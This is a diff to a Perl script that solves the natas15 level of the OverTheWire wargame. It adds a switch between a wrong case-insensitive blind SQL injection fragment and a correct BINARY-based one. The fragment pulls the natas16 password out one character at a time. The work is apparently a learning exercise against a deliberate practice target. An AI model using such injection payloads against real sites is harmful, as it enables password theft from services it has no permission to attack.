@@ -6,6 +6,10 @@ use v5.16.3;
 use Carp qw/ confess /;
 use URI;
 use HTTP::Tiny 0.034;
+use Getopt::Long;
+
+my $opts = { wrong => 0 };
+GetOptions( $opts, 'wrong!' );
 
 my $host = 'natas15.natas.labs.overthewire.org';
 my $uri  = URI->new(sprintf q{http://%s:%s@%s/index.php}, 'natas15', $ARGV[0], $host);
@@ -59,12 +63,25 @@ sub guess_length {
 
 sub guess_next_char {
     my $pos = shift;
-    my $sql_fragment = <<'END_SQL_FRAGMENT';
+    my $sql_fragment = sub {
+        my $sql;
+        if ($opts->{wrong}) {
+            $sql = <<'WRONG_SQL';
+natas16" and STRCMP(
+    SUBSTR(password, %d, 1),
+    '%s') = 0 #
+WRONG_SQL
+        }
+        else {
+            $sql = <<'RIGHT_SQL';
 natas16" and STRCMP(
     BINARY(SUBSTR(password, %d, 1)),
     BINARY('%s')) = 0 #
-END_SQL_FRAGMENT
-    chomp($sql_fragment);
+RIGHT_SQL
+        }
+        chomp $sql;
+        return $sql;
+    }->();
 
     CHAR:
     foreach my $char ('a'..'z', 'A'..'Z', 0..9) {
